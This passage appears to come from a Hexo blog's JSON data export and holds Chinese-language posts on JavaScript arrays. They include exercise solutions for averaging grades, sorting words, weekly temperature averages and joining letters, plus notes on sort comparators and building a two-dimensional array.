class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Grades</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = [];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  add(gradeNum) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> gradeNum !== <span class=\"string\">\"number\"</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore.push(gradeNum);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  average() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore.length === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> totoal = <span class=\"keyword\">this</span>.dataStore.reduce(<span class=\"function\">(<span class=\"params\">pre, cur</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> pre + cur;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (totoal / <span class=\"keyword\">this</span>.dataStore.length).toFixed(<span class=\"number\">2</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> grades = <span class=\"keyword\">new</span> Grades();</span><br><span class=\"line\">grades.add(<span class=\"number\">80</span>);</span><br><span class=\"line\">grades.add(<span class=\"number\">90</span>);</span><br><span class=\"line\">grades.add(<span class=\"number\">110</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(grades.average()); <span class=\"comment\">// 93.33</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"练习二\"><a href=\"#练习二\" class=\"headerlink\" title=\"练习二\"></a>练习二</h2><p>将一组单词存储在一个数组中，并按正序和倒序分别显示这些单词。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"string\">\"baidu\"</span>, <span class=\"string\">\"ali\"</span>, <span class=\"string\">\"tengxun\"</span>, <span class=\"string\">\"jingdong\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">let</span> str = arr.sort().join(<span class=\"string\">\",\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> str2 = arr</span><br><span class=\"line\">  .sort()</span><br><span class=\"line\">  .reverse()</span><br><span class=\"line\">  .join(<span class=\"string\">\",\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str); <span class=\"comment\">// ali,baidu,jingdong,tengxun</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str2); <span class=\"comment\">// tengxun,jingdong,baidu,ali</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"练习三\"><a href=\"#练习三\" class=\"headerlink\" title=\"练习三\"></a>练习三</h2><p>用一个二维数组存储每月的有用数据，增加一些方法显示月平均数，某一周平均数。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MonthlyTemps</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = [];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  add(weekIndex, temp) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.dataStore[weekIndex]) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.push([]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore[weekIndex].push(temp);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  average(weekIndex) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> total = <span class=\"number\">0</span>,</span><br><span class=\"line\">      count = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> weekIndex !== <span class=\"string\">\"undefined\"</span>) &#123;</span><br><span class=\"line\">      count = <span class=\"keyword\">this</span>.dataStore[weekIndex].length;</span><br><span class=\"line\">      total = <span class=\"keyword\">this</span>.dataStore[weekIndex].reduce(<span class=\"function\">(<span class=\"params\">pre, cur</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> pre + cur;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> (total / count).toFixed(<span class=\"number\">2</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.forEach(<span class=\"function\"><span class=\"params\">ele</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">Array</span>.isArray(ele)) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        count += ele.length;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> weekTotal = ele.reduce(<span class=\"function\">(<span class=\"params\">pre, cur</span>) =&gt;</span> &#123;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> pre + cur;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        total += weekTotal;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (total / count).toFixed(<span class=\"number\">2</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> monthlyTemps = <span class=\"keyword\">new</span> MonthlyTemps();</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">0</span>, <span class=\"number\">52</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">0</span>, <span class=\"number\">55</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">0</span>, <span class=\"number\">61</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">0</span>, <span class=\"number\">65</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">0</span>, <span class=\"number\">50</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">0</span>, <span class=\"number\">57</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">0</span>, <span class=\"number\">59</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">1</span>, <span class=\"number\">54</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">1</span>, <span class=\"number\">55</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">1</span>, <span class=\"number\">61</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">1</span>, <span class=\"number\">65</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">1</span>, <span class=\"number\">50</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">1</span>, <span class=\"number\">57</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">1</span>, <span class=\"number\">59</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(monthlyTemps.average(<span class=\"number\">0</span>)); <span class=\"comment\">// 57.00</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(monthlyTemps.average()); <span class=\"comment\">// 57.14</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"练习四\"><a href=\"#练习四\" class=\"headerlink\" title=\"练习四\"></a>练习四</h2><p>创建这样一个对象，它将字符存储在一个数组中，并且用一个方法可以将字母连在一起，显示成一个单词。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyLetters</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = [];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  add(letter) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore.push(letter);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  word() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore.join(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> myLetters = <span class=\"keyword\">new</span> MyLetters();</span><br><span class=\"line\">myLetters.add(<span class=\"string\">\"h\"</span>);</span><br><span class=\"line\">myLetters.add(<span class=\"string\">\"i\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> myword = myLetters.word();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(myword); <span class=\"comment\">// hi</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>《数据结构与算法 JavaScript 描述》</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>数据结构数组相关练习题。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"练习一\"><a href=\"#练习一\" class=\"headerlink\" title=\"练习一\"></a>练习一</h2><p>创建一个记录学生成绩的对象，提供一个添加成绩的方法，以及一个现实学生平均成绩的方法。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Grades</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = [];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  add(gradeNum) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> gradeNum !== <span class=\"string\">\"number\"</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore.push(gradeNum);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  average() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore.length === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> totoal = <span class=\"keyword\">this</span>.dataStore.reduce(<span class=\"function\">(<span class=\"params\">pre, cur</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> pre + cur;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (totoal / <span class=\"keyword\">this</span>.dataStore.length).toFixed(<span class=\"number\">2</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> grades = <span class=\"keyword\">new</span> Grades();</span><br><span class=\"line\">grades.add(<span class=\"number\">80</span>);</span><br><span class=\"line\">grades.add(<span class=\"number\">90</span>);</span><br><span class=\"line\">grades.add(<span class=\"number\">110</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(grades.average()); <span class=\"comment\">// 93.33</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"练习二\"><a href=\"#练习二\" class=\"headerlink\" title=\"练习二\"></a>练习二</h2><p>将一组单词存储在一个数组中，并按正序和倒序分别显示这些单词。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"string\">\"baidu\"</span>, <span class=\"string\">\"ali\"</span>, <span class=\"string\">\"tengxun\"</span>, <span class=\"string\">\"jingdong\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">let</span> str = arr.sort().join(<span class=\"string\">\",\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> str2 = arr</span><br><span class=\"line\">  .sort()</span><br><span class=\"line\">  .reverse()</span><br><span class=\"line\">  .join(<span class=\"string\">\",\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str); <span class=\"comment\">// ali,baidu,jingdong,tengxun</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str2); <span class=\"comment\">// tengxun,jingdong,baidu,ali</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"练习三\"><a href=\"#练习三\" class=\"headerlink\" title=\"练习三\"></a>练习三</h2><p>用一个二维数组存储每月的有用数据，增加一些方法显示月平均数，某一周平均数。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MonthlyTemps</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = [];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  add(weekIndex, temp) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.dataStore[weekIndex]) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.push([]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore[weekIndex].push(temp);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  average(weekIndex) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> total = <span class=\"number\">0</span>,</span><br><span class=\"line\">      count = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> weekIndex !== <span class=\"string\">\"undefined\"</span>) &#123;</span><br><span class=\"line\">      count = <span class=\"keyword\">this</span>.dataStore[weekIndex].length;</span><br><span class=\"line\">      total = <span class=\"keyword\">this</span>.dataStore[weekIndex].reduce(<span class=\"function\">(<span class=\"params\">pre, cur</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> pre + cur;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> (total / count).toFixed(<span class=\"number\">2</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.forEach(<span class=\"function\"><span class=\"params\">ele</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">Array</span>.isArray(ele)) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        count += ele.length;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> weekTotal = ele.reduce(<span class=\"function\">(<span class=\"params\">pre, cur</span>) =&gt;</span> &#123;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> pre + cur;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        total += weekTotal;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (total / count).toFixed(<span class=\"number\">2</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> monthlyTemps = <span class=\"keyword\">new</span> MonthlyTemps();</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">0</span>, <span class=\"number\">52</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">0</span>, <span class=\"number\">55</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">0</span>, <span class=\"number\">61</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">0</span>, <span class=\"number\">65</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">0</span>, <span class=\"number\">50</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">0</span>, <span class=\"number\">57</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">0</span>, <span class=\"number\">59</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">1</span>, <span class=\"number\">54</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">1</span>, <span class=\"number\">55</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">1</span>, <span class=\"number\">61</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">1</span>, <span class=\"number\">65</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">1</span>, <span class=\"number\">50</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">1</span>, <span class=\"number\">57</span>);</span><br><span class=\"line\">monthlyTemps.add(<span class=\"number\">1</span>, <span class=\"number\">59</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(monthlyTemps.average(<span class=\"number\">0</span>)); <span class=\"comment\">// 57.00</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(monthlyTemps.average()); <span class=\"comment\">// 57.14</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"练习四\"><a href=\"#练习四\" class=\"headerlink\" title=\"练习四\"></a>练习四</h2><p>创建这样一个对象，它将字符存储在一个数组中，并且用一个方法可以将字母连在一起，显示成一个单词。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyLetters</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = [];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  add(letter) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore.push(letter);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  word() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore.join(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> myLetters = <span class=\"keyword\">new</span> MyLetters();</span><br><span class=\"line\">myLetters.add(<span class=\"string\">\"h\"</span>);</span><br><span class=\"line\">myLetters.add(<span class=\"string\">\"i\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> myword = myLetters.word();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(myword); <span class=\"comment\">// hi</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>《数据结构与算法 JavaScript 描述》</p>"},{"title":"数据结构与算法@数组","date":"2019-05-18T07:04:38.000Z","updated":"2019-05-18T07:04:38.000Z","_content":"\n# 概述\n\n数组是计算机编程世界里最常见的数据结构。任何编程语言都包含，为内建类型，效率很高。本篇主要梳理 JavaScript 中数组的相关知识点。整体结构如下，具体细节见参考书籍，常见使用场景见详述部分。\n![思维导图](0.svg)\n\n<!-- more -->\n\n# 详述\n\n数组在 JavaScript 中只是一种特殊的对象，所以一个数组中的元素可以是各种类型，不必像其他语言要求是同一种类型。\n\n## sort 中使用比较函数\n\nsort()方法是按照字典顺序对元素进行排序的，因此它假定元素都是字符串类型。实际场景中通常需要排序数字类型、对象类型等，这样就需要传入一个比较函数来实现我们的目标。\n\n### 数字类型排序\n\n```js\nvar numbers = [10, 3, 22, 6, 4];\nnumbers.sort();\n// [10, 22, 3, 4, 6]\n\nfunction compare(num1, num2) {\n  return num1 - num2;\n}\nnumbers.sort(compare);\n// [3, 4, 6, 10, 22]\n```\n\n### 对象类型排序\n\n```js\nvar students = [\n  {\n    name: \"baidu\",\n    age: 12\n  },\n  {\n    name: \"ali\",\n    age: 22\n  },\n  {\n    name: \"tengxun\",\n    age: 8\n  }\n];\n\nfunction compareFunc(propName) {\n  return function(obj1, obj2) {\n    var value1 = obj1[propName];\n    var value2 = obj2[propName];\n    if (value1 < value2) {\n      return -1;\n    } else if (value1 > value2) {\n      return 1;\n    } else {\n      return 0;\n    }\n  };\n}\n// 按age排序\nstudents.sort(compareFunc(\"age\"));\n// 按name排序\nstudents.sort(compareFunc(\"name\"));\n```\n\n## 创建二维数组通用方法\n\n```js\nArray.matrix = function(numRows, numCols, initial) {\n  var arr = [];\n  for (var i = 0; i < numRows; i++) {\n    var columns = [];\n    for (var j = 0; j < numCols; j++) {\n      columns[j] = initial;\n    }\n    arr[i] = columns;\n  }\n  return arr;\n};\n```\n\n## 练习\n\n更多练习及实现答案请参考下一篇[数据结构——数组(练习题及实现)](/2019/04/28/data-structures-array-2)\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n《学习 JavaScript 数据结构与算法（第 2 版）》\n","source":"_posts/2019/05/数据结构与算法-数组.md","raw":"---\ntitle: 数据结构与算法@数组\npermalink: 数据结构与算法@数组\ntags:\n  - JavaScript\ncategories:\n  - 基础\n  - 数据结构与算法\ndate: 2019-05-18 15:04:38\nupdated: 2019-05-18 15:04:38\n---\n\n# 概述\n\n数组是计算机编程世界里最常见的数据结构。任何编程语言都包含，为内建类型，效率很高。本篇主要梳理 JavaScript 中数组的相关知识点。整体结构如下，具体细节见参考书籍，常见使用场景见详述部分。\n![思维导图](0.svg)\n\n<!-- more -->\n\n# 详述\n\n数组在 JavaScript 中只是一种特殊的对象，所以一个数组中的元素可以是各种类型，不必像其他语言要求是同一种类型。\n\n## sort 中使用比较函数\n\nsort()方法是按照字典顺序对元素进行排序的，因此它假定元素都是字符串类型。实际场景中通常需要排序数字类型、对象类型等，这样就需要传入一个比较函数来实现我们的目标。\n\n### 数字类型排序\n\n```js\nvar numbers = [10, 3, 22, 6, 4];\nnumbers.sort();\n// [10, 22, 3, 4, 6]\n\nfunction compare(num1, num2) {\n  return num1 - num2;\n}\nnumbers.sort(compare);\n// [3, 4, 6, 10, 22]\n```\n\n### 对象类型排序\n\n```js\nvar students = [\n  {\n    name: \"baidu\",\n    age: 12\n  },\n  {\n    name: \"ali\",\n    age: 22\n  },\n  {\n    name: \"tengxun\",\n    age: 8\n  }\n];\n\nfunction compareFunc(propName) {\n  return function(obj1, obj2) {\n    var value1 = obj1[propName];\n    var value2 = obj2[propName];\n    if (value1 < value2) {\n      return -1;\n    } else if (value1 > value2) {\n      return 1;\n    } else {\n      return 0;\n    }\n  };\n}\n// 按age排序\nstudents.sort(compareFunc(\"age\"));\n// 按name排序\nstudents.sort(compareFunc(\"name\"));\n```\n\n## 创建二维数组通用方法\n\n```js\nArray.matrix = function(numRows, numCols, initial) {\n  var arr = [];\n  for (var i = 0; i < numRows; i++) {\n    var columns = [];\n    for (var j = 0; j < numCols; j++) {\n      columns[j] = initial;\n    }\n    arr[i] = columns;\n  }\n  return arr;\n};\n```\n\n## 练习\n\n更多练习及实现答案请参考下一篇[数据结构——数组(练习题及实现)](/2019/04/28/data-structures-array-2)\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n《学习 JavaScript 数据结构与算法（第 2 版）》\n","slug":"数据结构与算法@数组","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8y1007uwovv22img58o","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" 